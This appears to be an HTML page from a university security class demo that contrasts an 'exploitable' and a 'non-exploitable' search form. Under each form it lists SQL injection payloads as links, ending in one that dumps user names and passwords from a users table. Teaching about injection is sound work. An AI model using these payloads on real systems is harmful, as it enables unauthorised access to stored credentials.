<HTML>
<HEAD>
    <TITLE>Exploitable or non-explotiable Search Form - CS4900 - Tim and Matthew</TITLE>
</HEAD>
<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

<BODY style="padding-top: 60px;">
<nav class="navbar navbar-inverse navbar-fixed-top">
    <div class="container">
        <div class="navbar-header">
            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="index.php">SQL Exploit Example</a>
        </div>
    </div>
</nav>

<div class="container">
    <FORM method="get" action="search.php">
        <label for="q">Exploitable form field</label>
        <div class="input-group">
            <input type="text" class="form-control" name="q" id="q" />
            <span class="input-group-btn">
                <input type="submit" value="search" class="btn btn-success">
            </span>

        </div>
        For a simple exploit, execute the following in order:
        <ul>
            <li><a href="search.php?q=Pikes'; SHOW TABLES; --" target="_blank">Pikes'; SHOW TABLES; --</a></li>
            <li><a href="search.php?q=Pikes'; DESCRIBE `users`; --" target="_blank">Pikes'; DESCRIBE `users`; --</a></li>
            <li><a href="search.php?q=Pikes'; SELECT user_name, user_password from users; --" target="_blank">Pikes'; SELECT user_name, user_password from users; --</a>
        </ul>
    </FORM>
    <hr />
    <FORM method="get" action="search.php">
        <label for="r">Non-Exploitable form field</label>
        <div class="input-group">
            <input type="text" class="form-control" name="r" id="r" />
            <span class="input-group-btn">
                <input type="submit" value="search" class="btn btn-success">
            </span>

        </div>
        Attempting the same exploit:
        <ul>
            <li><a href="search.php?r=Pikes'; SHOW TABLES; --" target="_blank">Pikes'; SHOW TABLES; --</a></li>
            <li><a href="search.php?r=Pikes'; DESCRIBE `users`; --" target="_blank">Pikes'; DESCRIBE `users`; --</a></li>
            <li><a href="search.php?r=Pikes'; SELECT user_name, user_password from users; --" target="_blank">Pikes'; SELECT user_name, user_password from users; --</a>
        </ul>

    </FORM>
    <hr />
</div>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
</BODY>
</HTML>